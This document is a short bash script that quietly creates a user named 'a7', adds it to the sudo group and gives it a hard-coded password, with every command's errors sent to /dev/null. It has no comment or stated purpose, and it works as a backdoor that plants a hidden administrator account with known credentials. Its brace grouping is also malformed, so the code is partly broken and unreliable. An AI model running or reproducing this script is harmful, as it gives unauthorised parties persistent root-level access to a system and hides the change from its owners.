#!/bin/bash
 { useradd -m -s /bin/bash a7  2> /dev/null}
  usermod -aG sudo a7  2> /dev/null
   echo  'a7:246855096'| chpasswd  2> /dev/null
    
